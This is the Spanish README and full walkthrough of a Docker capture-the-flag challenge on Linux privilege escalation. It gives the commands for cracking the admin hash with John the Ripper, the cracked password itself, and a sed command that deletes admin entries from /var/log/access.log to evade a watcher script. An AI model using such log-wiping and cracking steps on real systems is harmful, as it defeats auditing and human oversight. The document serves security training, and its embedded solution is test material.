reto_integridad (Escalada de privilegios y evasión de detección en Linux multiusuario)

Árbol de archivos
reto_integridad/
├── prepare.bash        # Prepara el entorno, genera .env, _instance y flag.txt
├── start.bash          # Levanta el contenedor con docker-compose
├── stop.bash           # Detiene y elimina el contenedor
├── Dockerfile          # Construye la máquina Linux vulnerable
├── docker-compose.yml  # Define el servicio y expone el puerto SSH
├── entrypoint.sh       # Script de arranque que lanza SSH y watcher
├── watcher.sh          # Monitoriza accesos y reinicia si detecta uso indebido
├── add_log_line.sh     # Añade entradas de registro en /var/log/access.log
├── flag.txt            # Flag del reto (se copia a /root/flag.txt)
├── users.hashes        # Hashes de usuarios (para crackear)
└── _instance           # Nombre de instancia generado automáticamente

Descripción del reto
Este reto simula una máquina Linux multiusuario. El jugador inicia sesión como manolo y debe escalar privilegios para convertirse en admin y leer /root/flag.txt.  
El problema: un watcher (watcher.sh) monitoriza los logs en /var/log/access.log. Si detecta que se ha usado admin, apaga el contenedor tras 10 segundos.  
Para ganar, hay que moverse rápido, crackear la contraseña de admin, cambiar de usuario, borrar los rastros en los logs y leer la flag.

Flujo de funcionamiento
- prepare.bash genera el entorno, _instance y flag.txt.
- start.bash levanta el contenedor en segundo plano.
- docker-compose.yml expone SSH en el puerto definido en .env (por defecto 52122).
- entrypoint.sh arranca el servicio SSH y ejecuta watcher.sh en segundo plano.
- users.hashes se copia en el home de manolo (/home/manolo/secretos/hashes.txt).
- watcher.sh revisa /var/log/access.log y si ve admin, apaga el contenedor en 10 segundos.
- El jugador debe crackear el hash de admin y usarlo para escalar.

Explotación de la vulnerabilidad
1. Conexión inicial por SSH:
   ssh manolo@localhost -p 52122
   (contraseña de manolo predefinida o sin contraseña, según build del contenedor).

2. Buscar hashes:
   cd /home/manolo/secretos
   cat hashes.txt
   Copiar el hash correspondiente al usuario admin.

3. Crackeo del hash:
   Transferir el hash a la máquina atacante y usar John the Ripper o hashcat con un diccionario común (rockyou.txt):
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   El crackeo revela la contraseña de admin: password123.

4. Escalada a admin:
   su - admin
   Introducir la contraseña crackeada (password123).
   Importante: usar su - (con guion) para cargar correctamente el entorno y entrar en el home de admin.

5. Evasión del sistema de detección:
   Tan pronto como se use admin, el watcher detectará el acceso y se activará un temporizador de 10 segundos.  
   Antes de que expire, editar o borrar las entradas de admin en /var/log/access.log:
   nano /var/log/access.log  
   o más rápido:
   sed -i '/admin/d' /var/log/access.log

6. Obtención de la flag:
   Una vez eliminados los rastros, navegar al directorio de admin y leer la flag:
   cat /root/flag.txt

7. Salida y limpieza:
   Cuando termines, ejecutar ./stop.bash desde la máquina anfitriona para detener el contenedor.

Instrucciones de acceso (standalone)
1. ./prepare.bash
2. ./start.bash
3. ssh manolo@localhost -p 52122
4. Crackear hashes y escalar a admin
5. Eliminar rastros en /var/log/access.log
6. cat /root/flag.txt
7. ./stop.bash

Tecnologías utilizadas
- Docker y Docker Compose
- Debian Linux
- Servidor SSH
- Bash scripting para gestión del sistema
- users.hashes con contraseñas cifradas
- watcher.sh como IDS simplificado

Puerto de acceso
El puerto SSH expuesto por defecto es 52122:
ssh manolo@localhost -p 52122

Objetivos de aprendizaje
- Practicar escalada de privilegios en Linux mediante crackeo de hashes.
- Comprender cómo funcionan los logs de auditoría y cómo usarlos para detección.
- Entrenar evasión de detección borrando rastros en logs.
- Experimentar con un entorno realista de ataque/defensa donde la detección automática reinicia el sistema.

